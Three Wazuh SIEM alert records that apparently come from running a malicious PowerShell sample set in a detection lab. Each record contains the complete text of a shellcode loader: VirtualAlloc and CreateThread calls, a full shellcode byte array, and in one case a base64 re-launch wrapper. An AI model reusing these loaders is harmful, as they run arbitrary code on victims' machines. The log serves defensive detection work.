{"timestamp":"2026-07-06T02:21:26.558+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":180,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304486.3857603","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:21:46.8759945Z","eventRecordID":"145708","processID":"2952","threadID":"6360","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$seo = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $seo -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbe,0x5a,0xc4,0x97,0xb4,0xdb,0xd1,0xd9,0x74,0x24,0xf4,0x5a,0x2b,0xc9,0xb1,0x47,0x83,0xc2,0x04,0x31,0x72,0x0f,0x03,0x72,0x55,0x26,0x62,0x48,0x81,0x24,0x8d,0xb1,0x51,0x49,0x07,0x54,0x60,0x49,0x73,0x1c,0xd2,0x79,0xf7,0x70,0xde,0xf2,0x55,0x61,0x55,0x76,0x72,0x86,0xde,0x3d,0xa4,0xa9,0xdf,0x6e,0x94,0xa8,0x63,0x6d,0xc9,0x0a,0x5a,0xbe,0x1c,0x4a,0x9b,0xa3,0xed,0x1e,0x74,0xaf,0x40,0x8f,0xf1,0xe5,0x58,0x24,0x49,0xeb,0xd8,0xd9,0x19,0x0a,0xc8,0x4f,0x12,0x55,0xca,0x6e,0xf7,0xed,0x43,0x69,0x14,0xcb,0x1a,0x02,0xee,0xa7,0x9c,0xc2,0x3f,0x47,0x32,0x2b,0xf0,0xba,0x4a,0x6b,0x36,0x25,0x39,0x85,0x45,0xd8,0x3a,0x52,0x34,0x06,0xce,0x41,0x9e,0xcd,0x68,0xae,0x1f,0x01,0xee,0x25,0x13,0xee,0x64,0x61,0x37,0xf1,0xa9,0x19,0x43,0x7a,0x4c,0xce,0xc2,0x38,0x6b,0xca,0x8f,0x9b,0x12,0x4b,0x75,0x4d,0x2a,0x8b,0xd6,0x32,0x8e,0xc7,0xfa,0x27,0xa3,0x85,0x92,0x84,0x8e,0x35,0x62,0x83,0x99,0x46,0x50,0x0c,0x32,0xc1,0xd8,0xc5,0x9c,0x16,0x1f,0xfc,0x59,0x88,0xde,0xff,0x99,0x80,0x24,0xab,0xc9,0xba,0x8d,0xd4,0x81,0x3a,0x32,0x01,0x3f,0x3e,0xa4,0x6a,0x68,0x41,0x39,0x03,0x6b,0x42,0x40,0x68,0xe2,0xa4,0x12,0xde,0xa5,0x78,0xd2,0x8e,0x05,0x29,0xba,0xc4,0x89,0x16,0xda,0xe6,0x43,0x3f,0x70,0x09,0x3a,0x17,0xec,0xb0,0x67,0xe3,0x8d,0x3d,0xb2,0x89,0x8d,0xb6,0x31,0x6d,0x43,0x3f,0x3f,0x7d,0x33,0xcf,0x0a,0xdf,0x95,0xd0,0xa0,0x4a,0x19,0x45,0x4f,0xdd,0x4e,0xf1,0x4d,0x38,0xb8,0x5e,0xad,0x6f,0xb3,0x57,0x3b,0xd0,0xab,0x97,0xab,0xd0,0x2b,0xce,0xa1,0xd0,0x43,0xb6,0x91,0x82,0x76,0xb9,0x0f,0xb7,0x2b,0x2c,0xb0,0xee,0x98,0xe7,0xd8,0x0c,0xc7,0xc0,0x46,0xee,0x22,0xd1,0xbb,0x39,0x0a,0xa7,0xd5,0xf9;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$8NW=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($8NW.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$8NW,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: db716812-cfcc-4339-9f98-a7b599efcf80\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\3589.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$seo = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $seo -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbe,0x5a,0xc4,0x97,0xb4,0xdb,0xd1,0xd9,0x74,0x24,0xf4,0x5a,0x2b,0xc9,0xb1,0x47,0x83,0xc2,0x04,0x31,0x72,0x0f,0x03,0x72,0x55,0x26,0x62,0x48,0x81,0x24,0x8d,0xb1,0x51,0x49,0x07,0x54,0x60,0x49,0x73,0x1c,0xd2,0x79,0xf7,0x70,0xde,0xf2,0x55,0x61,0x55,0x76,0x72,0x86,0xde,0x3d,0xa4,0xa9,0xdf,0x6e,0x94,0xa8,0x63,0x6d,0xc9,0x0a,0x5a,0xbe,0x1c,0x4a,0x9b,0xa3,0xed,0x1e,0x74,0xaf,0x40,0x8f,0xf1,0xe5,0x58,0x24,0x49,0xeb,0xd8,0xd9,0x19,0x0a,0xc8,0x4f,0x12,0x55,0xca,0x6e,0xf7,0xed,0x43,0x69,0x14,0xcb,0x1a,0x02,0xee,0xa7,0x9c,0xc2,0x3f,0x47,0x32,0x2b,0xf0,0xba,0x4a,0x6b,0x36,0x25,0x39,0x85,0x45,0xd8,0x3a,0x52,0x34,0x06,0xce,0x41,0x9e,0xcd,0x68,0xae,0x1f,0x01,0xee,0x25,0x13,0xee,0x64,0x61,0x37,0xf1,0xa9,0x19,0x43,0x7a,0x4c,0xce,0xc2,0x38,0x6b,0xca,0x8f,0x9b,0x12,0x4b,0x75,0x4d,0x2a,0x8b,0xd6,0x32,0x8e,0xc7,0xfa,0x27,0xa3,0x85,0x92,0x84,0x8e,0x35,0x62,0x83,0x99,0x46,0x50,0x0c,0x32,0xc1,0xd8,0xc5,0x9c,0x16,0x1f,0xfc,0x59,0x88,0xde,0xff,0x99,0x80,0x24,0xab,0xc9,0xba,0x8d,0xd4,0x81,0x3a,0x32,0x01,0x3f,0x3e,0xa4,0x6a,0x68,0x41,0x39,0x03,0x6b,0x42,0x40,0x68,0xe2,0xa4,0x12,0xde,0xa5,0x78,0xd2,0x8e,0x05,0x29,0xba,0xc4,0x89,0x16,0xda,0xe6,0x43,0x3f,0x70,0x09,0x3a,0x17,0xec,0xb0,0x67,0xe3,0x8d,0x3d,0xb2,0x89,0x8d,0xb6,0x31,0x6d,0x43,0x3f,0x3f,0x7d,0x33,0xcf,0x0a,0xdf,0x95,0xd0,0xa0,0x4a,0x19,0x45,0x4f,0xdd,0x4e,0xf1,0x4d,0x38,0xb8,0x5e,0xad,0x6f,0xb3,0x57,0x3b,0xd0,0xab,0x97,0xab,0xd0,0x2b,0xce,0xa1,0xd0,0x43,0xb6,0x91,0x82,0x76,0xb9,0x0f,0xb7,0x2b,0x2c,0xb0,0xee,0x98,0xe7,0xd8,0x0c,0xc7,0xc0,0x46,0xee,0x22,0xd1,0xbb,0x39,0x0a,0xa7,0xd5,0xf9;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$8NW=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($8NW.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$8NW,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"db716812-cfcc-4339-9f98-a7b599efcf80","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\3589.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:21:28.029+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":181,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304488.3868952","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:21:48.5072811Z","eventRecordID":"145719","processID":"1720","threadID":"2172","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$oT20 = '$mgi = ''[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $mgi -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbe,0xf1,0xf5,0xe8,0x9a,0xda,0xd4,0xd9,0x74,0x24,0xf4,0x58,0x2b,0xc9,0xb1,0x57,0x31,0x70,0x12,0x03,0x70,0x12,0x83,0x31,0xf1,0x0a,0x6f,0x4d,0x12,0x48,0x90,0xad,0xe3,0x2d,0x18,0x48,0xd2,0x6d,0x7e,0x19,0x45,0x5e,0xf4,0x4f,0x6a,0x15,0x58,0x7b,0xf9,0x5b,0x75,0x8c,0x4a,0xd1,0xa3,0xa3,0x4b,0x4a,0x97,0xa2,0xcf,0x91,0xc4,0x04,0xf1,0x59,0x19,0x45,0x36,0x87,0xd0,0x17,0xef,0xc3,0x47,0x87,0x84,0x9e,0x5b,0x2c,0xd6,0x0f,0xdc,0xd1,0xaf,0x2e,0xcd,0x44,0xbb,0x68,0xcd,0x67,0x68,0x01,0x44,0x7f,0x6d,0x2c,0x1e,0xf4,0x45,0xda,0xa1,0xdc,0x97,0x23,0x0d,0x21,0x18,0xd6,0x4f,0x66,0x9f,0x09,0x3a,0x9e,0xe3,0xb4,0x3d,0x65,0x99,0x62,0xcb,0x7d,0x39,0xe0,0x6b,0x59,0xbb,0x25,0xed,0x2a,0xb7,0x82,0x79,0x74,0xd4,0x15,0xad,0x0f,0xe0,0x9e,0x50,0xdf,0x60,0xe4,0x76,0xfb,0x29,0xbe,0x17,0x5a,0x94,0x11,0x27,0xbc,0x77,0xcd,0x8d,0xb7,0x9a,0x1a,0xbc,0x9a,0xf2,0xb2,0xda,0x50,0x03,0x23,0x52,0xf1,0x6d,0xda,0xc8,0x69,0x3e,0x6b,0xd7,0x6e,0x41,0x46,0x26,0xab,0xee,0x3a,0x1a,0x18,0x42,0xd5,0xa6,0xc8,0x1d,0x82,0x28,0x21,0x8e,0x9f,0xbc,0xca,0x62,0x73,0x29,0xbc,0x93,0x73,0xa9,0xd4,0x10,0x73,0xa9,0x24,0x06,0x38,0xf0,0x6a,0x69,0xf8,0x02,0x22,0xe1,0xaf,0x8b,0x5d,0x37,0xb0,0x59,0xe8,0x7e,0x1c,0x0a,0xea,0x4c,0x43,0x4e,0xb9,0xe3,0xd0,0x18,0x6e,0x52,0xbf,0x4d,0xc5,0x74,0x04,0x6d,0x30,0x1e,0x10,0x9b,0xe5,0x77,0x65,0xa8,0x19,0x88,0xec,0x2f,0x73,0x8c,0xbe,0xc5,0x9c,0xda,0x56,0x6f,0xe4,0x7c,0x20,0x70,0x3d,0xd3,0x7e,0xdc,0xee,0x82,0xe8,0xcf,0x16,0x33,0x92,0xf0,0xc3,0xc6,0xa4,0x7a,0xe1,0x87,0x51,0x5c,0x9d,0xe7,0x2f,0xfc,0x0b,0xf7,0x85,0x6b,0xf3,0x6f,0x26,0x7c,0xf3,0x6f,0x4e,0x7c,0xf3,0x2f,0x8e,0x2f,0x9b,0xf7,0x2a,0x9c,0xbe,0xf7,0xe6,0xb0,0x13,0x5b,0x80,0x50,0xc4,0x33,0x92,0xbe,0xea,0xc3,0xc1,0xe8,0x82,0xd1,0x73,0x9d,0xb0,0x29,0xae,0x1b,0xf4,0xa2,0x9c,0xaf,0xf3,0x4b,0xdc,0x35,0x3b,0x3e,0x07,0x6d,0x78,0x9e,0x2f,0xfb,0x81,0xde,0x4f,0x35,0x44,0x13,0x9e,0x07,0x80,0x6b,0xf0,0x57,0xc2,0xba,0x3f,0x98;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$o8Y=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($o8Y.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$o8Y,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($oT20));$WUNH = \"-e \";if([IntPtr]::Size -eq 8){$YIr = $env:SystemRoot + \"\\syswow64\\WindowsPowerShell\\v1.0\\powershell\";iex \"& $YIr $WUNH $e\"}else{;iex \"& powershell $WUNH $e\";}\r\n\r\nScriptBlock ID: f6a6f688-6509-4ca9-a2b0-6ae994c8db00\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\3611.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$oT20 = '$mgi = ''[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $mgi -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbe,0xf1,0xf5,0xe8,0x9a,0xda,0xd4,0xd9,0x74,0x24,0xf4,0x58,0x2b,0xc9,0xb1,0x57,0x31,0x70,0x12,0x03,0x70,0x12,0x83,0x31,0xf1,0x0a,0x6f,0x4d,0x12,0x48,0x90,0xad,0xe3,0x2d,0x18,0x48,0xd2,0x6d,0x7e,0x19,0x45,0x5e,0xf4,0x4f,0x6a,0x15,0x58,0x7b,0xf9,0x5b,0x75,0x8c,0x4a,0xd1,0xa3,0xa3,0x4b,0x4a,0x97,0xa2,0xcf,0x91,0xc4,0x04,0xf1,0x59,0x19,0x45,0x36,0x87,0xd0,0x17,0xef,0xc3,0x47,0x87,0x84,0x9e,0x5b,0x2c,0xd6,0x0f,0xdc,0xd1,0xaf,0x2e,0xcd,0x44,0xbb,0x68,0xcd,0x67,0x68,0x01,0x44,0x7f,0x6d,0x2c,0x1e,0xf4,0x45,0xda,0xa1,0xdc,0x97,0x23,0x0d,0x21,0x18,0xd6,0x4f,0x66,0x9f,0x09,0x3a,0x9e,0xe3,0xb4,0x3d,0x65,0x99,0x62,0xcb,0x7d,0x39,0xe0,0x6b,0x59,0xbb,0x25,0xed,0x2a,0xb7,0x82,0x79,0x74,0xd4,0x15,0xad,0x0f,0xe0,0x9e,0x50,0xdf,0x60,0xe4,0x76,0xfb,0x29,0xbe,0x17,0x5a,0x94,0x11,0x27,0xbc,0x77,0xcd,0x8d,0xb7,0x9a,0x1a,0xbc,0x9a,0xf2,0xb2,0xda,0x50,0x03,0x23,0x52,0xf1,0x6d,0xda,0xc8,0x69,0x3e,0x6b,0xd7,0x6e,0x41,0x46,0x26,0xab,0xee,0x3a,0x1a,0x18,0x42,0xd5,0xa6,0xc8,0x1d,0x82,0x28,0x21,0x8e,0x9f,0xbc,0xca,0x62,0x73,0x29,0xbc,0x93,0x73,0xa9,0xd4,0x10,0x73,0xa9,0x24,0x06,0x38,0xf0,0x6a,0x69,0xf8,0x02,0x22,0xe1,0xaf,0x8b,0x5d,0x37,0xb0,0x59,0xe8,0x7e,0x1c,0x0a,0xea,0x4c,0x43,0x4e,0xb9,0xe3,0xd0,0x18,0x6e,0x52,0xbf,0x4d,0xc5,0x74,0x04,0x6d,0x30,0x1e,0x10,0x9b,0xe5,0x77,0x65,0xa8,0x19,0x88,0xec,0x2f,0x73,0x8c,0xbe,0xc5,0x9c,0xda,0x56,0x6f,0xe4,0x7c,0x20,0x70,0x3d,0xd3,0x7e,0xdc,0xee,0x82,0xe8,0xcf,0x16,0x33,0x92,0xf0,0xc3,0xc6,0xa4,0x7a,0xe1,0x87,0x51,0x5c,0x9d,0xe7,0x2f,0xfc,0x0b,0xf7,0x85,0x6b,0xf3,0x6f,0x26,0x7c,0xf3,0x6f,0x4e,0x7c,0xf3,0x2f,0x8e,0x2f,0x9b,0xf7,0x2a,0x9c,0xbe,0xf7,0xe6,0xb0,0x13,0x5b,0x80,0x50,0xc4,0x33,0x92,0xbe,0xea,0xc3,0xc1,0xe8,0x82,0xd1,0x73,0x9d,0xb0,0x29,0xae,0x1b,0xf4,0xa2,0x9c,0xaf,0xf3,0x4b,0xdc,0x35,0x3b,0x3e,0x07,0x6d,0x78,0x9e,0x2f,0xfb,0x81,0xde,0x4f,0x35,0x44,0x13,0x9e,0x07,0x80,0x6b,0xf0,0x57,0xc2,0xba,0x3f,0x98;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$o8Y=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($o8Y.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$o8Y,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($oT20));$WUNH = \\\"-e \\\";if([IntPtr]::Size -eq 8){$YIr = $env:SystemRoot + \\\"\\\\syswow64\\\\WindowsPowerShell\\\\v1.0\\\\powershell\\\";iex \\\"&amp; $YIr $WUNH $e\\\"}else{;iex \\\"&amp; powershell $WUNH $e\\\";}","scriptBlockId":"f6a6f688-6509-4ca9-a2b0-6ae994c8db00","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\3611.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:21:29.996+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":182,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304489.3882705","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:21:50.2378683Z","eventRecordID":"145729","processID":"184","threadID":"5400","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$mgi = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $mgi -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbe,0xf1,0xf5,0xe8,0x9a,0xda,0xd4,0xd9,0x74,0x24,0xf4,0x58,0x2b,0xc9,0xb1,0x57,0x31,0x70,0x12,0x03,0x70,0x12,0x83,0x31,0xf1,0x0a,0x6f,0x4d,0x12,0x48,0x90,0xad,0xe3,0x2d,0x18,0x48,0xd2,0x6d,0x7e,0x19,0x45,0x5e,0xf4,0x4f,0x6a,0x15,0x58,0x7b,0xf9,0x5b,0x75,0x8c,0x4a,0xd1,0xa3,0xa3,0x4b,0x4a,0x97,0xa2,0xcf,0x91,0xc4,0x04,0xf1,0x59,0x19,0x45,0x36,0x87,0xd0,0x17,0xef,0xc3,0x47,0x87,0x84,0x9e,0x5b,0x2c,0xd6,0x0f,0xdc,0xd1,0xaf,0x2e,0xcd,0x44,0xbb,0x68,0xcd,0x67,0x68,0x01,0x44,0x7f,0x6d,0x2c,0x1e,0xf4,0x45,0xda,0xa1,0xdc,0x97,0x23,0x0d,0x21,0x18,0xd6,0x4f,0x66,0x9f,0x09,0x3a,0x9e,0xe3,0xb4,0x3d,0x65,0x99,0x62,0xcb,0x7d,0x39,0xe0,0x6b,0x59,0xbb,0x25,0xed,0x2a,0xb7,0x82,0x79,0x74,0xd4,0x15,0xad,0x0f,0xe0,0x9e,0x50,0xdf,0x60,0xe4,0x76,0xfb,0x29,0xbe,0x17,0x5a,0x94,0x11,0x27,0xbc,0x77,0xcd,0x8d,0xb7,0x9a,0x1a,0xbc,0x9a,0xf2,0xb2,0xda,0x50,0x03,0x23,0x52,0xf1,0x6d,0xda,0xc8,0x69,0x3e,0x6b,0xd7,0x6e,0x41,0x46,0x26,0xab,0xee,0x3a,0x1a,0x18,0x42,0xd5,0xa6,0xc8,0x1d,0x82,0x28,0x21,0x8e,0x9f,0xbc,0xca,0x62,0x73,0x29,0xbc,0x93,0x73,0xa9,0xd4,0x10,0x73,0xa9,0x24,0x06,0x38,0xf0,0x6a,0x69,0xf8,0x02,0x22,0xe1,0xaf,0x8b,0x5d,0x37,0xb0,0x59,0xe8,0x7e,0x1c,0x0a,0xea,0x4c,0x43,0x4e,0xb9,0xe3,0xd0,0x18,0x6e,0x52,0xbf,0x4d,0xc5,0x74,0x04,0x6d,0x30,0x1e,0x10,0x9b,0xe5,0x77,0x65,0xa8,0x19,0x88,0xec,0x2f,0x73,0x8c,0xbe,0xc5,0x9c,0xda,0x56,0x6f,0xe4,0x7c,0x20,0x70,0x3d,0xd3,0x7e,0xdc,0xee,0x82,0xe8,0xcf,0x16,0x33,0x92,0xf0,0xc3,0xc6,0xa4,0x7a,0xe1,0x87,0x51,0x5c,0x9d,0xe7,0x2f,0xfc,0x0b,0xf7,0x85,0x6b,0xf3,0x6f,0x26,0x7c,0xf3,0x6f,0x4e,0x7c,0xf3,0x2f,0x8e,0x2f,0x9b,0xf7,0x2a,0x9c,0xbe,0xf7,0xe6,0xb0,0x13,0x5b,0x80,0x50,0xc4,0x33,0x92,0xbe,0xea,0xc3,0xc1,0xe8,0x82,0xd1,0x73,0x9d,0xb0,0x29,0xae,0x1b,0xf4,0xa2,0x9c,0xaf,0xf3,0x4b,0xdc,0x35,0x3b,0x3e,0x07,0x6d,0x78,0x9e,0x2f,0xfb,0x81,0xde,0x4f,0x35,0x44,0x13,0x9e,0x07,0x80,0x6b,0xf0,0x57,0xc2,0xba,0x3f,0x98;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$o8Y=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($o8Y.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$o8Y,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: b4611921-091d-4361-b7ff-3a9069dcef9b\r\nPath: \""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$mgi = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $mgi -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbe,0xf1,0xf5,0xe8,0x9a,0xda,0xd4,0xd9,0x74,0x24,0xf4,0x58,0x2b,0xc9,0xb1,0x57,0x31,0x70,0x12,0x03,0x70,0x12,0x83,0x31,0xf1,0x0a,0x6f,0x4d,0x12,0x48,0x90,0xad,0xe3,0x2d,0x18,0x48,0xd2,0x6d,0x7e,0x19,0x45,0x5e,0xf4,0x4f,0x6a,0x15,0x58,0x7b,0xf9,0x5b,0x75,0x8c,0x4a,0xd1,0xa3,0xa3,0x4b,0x4a,0x97,0xa2,0xcf,0x91,0xc4,0x04,0xf1,0x59,0x19,0x45,0x36,0x87,0xd0,0x17,0xef,0xc3,0x47,0x87,0x84,0x9e,0x5b,0x2c,0xd6,0x0f,0xdc,0xd1,0xaf,0x2e,0xcd,0x44,0xbb,0x68,0xcd,0x67,0x68,0x01,0x44,0x7f,0x6d,0x2c,0x1e,0xf4,0x45,0xda,0xa1,0xdc,0x97,0x23,0x0d,0x21,0x18,0xd6,0x4f,0x66,0x9f,0x09,0x3a,0x9e,0xe3,0xb4,0x3d,0x65,0x99,0x62,0xcb,0x7d,0x39,0xe0,0x6b,0x59,0xbb,0x25,0xed,0x2a,0xb7,0x82,0x79,0x74,0xd4,0x15,0xad,0x0f,0xe0,0x9e,0x50,0xdf,0x60,0xe4,0x76,0xfb,0x29,0xbe,0x17,0x5a,0x94,0x11,0x27,0xbc,0x77,0xcd,0x8d,0xb7,0x9a,0x1a,0xbc,0x9a,0xf2,0xb2,0xda,0x50,0x03,0x23,0x52,0xf1,0x6d,0xda,0xc8,0x69,0x3e,0x6b,0xd7,0x6e,0x41,0x46,0x26,0xab,0xee,0x3a,0x1a,0x18,0x42,0xd5,0xa6,0xc8,0x1d,0x82,0x28,0x21,0x8e,0x9f,0xbc,0xca,0x62,0x73,0x29,0xbc,0x93,0x73,0xa9,0xd4,0x10,0x73,0xa9,0x24,0x06,0x38,0xf0,0x6a,0x69,0xf8,0x02,0x22,0xe1,0xaf,0x8b,0x5d,0x37,0xb0,0x59,0xe8,0x7e,0x1c,0x0a,0xea,0x4c,0x43,0x4e,0xb9,0xe3,0xd0,0x18,0x6e,0x52,0xbf,0x4d,0xc5,0x74,0x04,0x6d,0x30,0x1e,0x10,0x9b,0xe5,0x77,0x65,0xa8,0x19,0x88,0xec,0x2f,0x73,0x8c,0xbe,0xc5,0x9c,0xda,0x56,0x6f,0xe4,0x7c,0x20,0x70,0x3d,0xd3,0x7e,0xdc,0xee,0x82,0xe8,0xcf,0x16,0x33,0x92,0xf0,0xc3,0xc6,0xa4,0x7a,0xe1,0x87,0x51,0x5c,0x9d,0xe7,0x2f,0xfc,0x0b,0xf7,0x85,0x6b,0xf3,0x6f,0x26,0x7c,0xf3,0x6f,0x4e,0x7c,0xf3,0x2f,0x8e,0x2f,0x9b,0xf7,0x2a,0x9c,0xbe,0xf7,0xe6,0xb0,0x13,0x5b,0x80,0x50,0xc4,0x33,0x92,0xbe,0xea,0xc3,0xc1,0xe8,0x82,0xd1,0x73,0x9d,0xb0,0x29,0xae,0x1b,0xf4,0xa2,0x9c,0xaf,0xf3,0x4b,0xdc,0x35,0x3b,0x3e,0x07,0x6d,0x78,0x9e,0x2f,0xfb,0x81,0xde,0x4f,0x35,0x44,0x13,0x9e,0x07,0x80,0x6b,0xf0,0x57,0xc2,0xba,0x3f,0x98;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$o8Y=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($o8Y.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$o8Y,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"b4611921-091d-4361-b7ff-3a9069dcef9b"}}},"location":"EventChannel"}
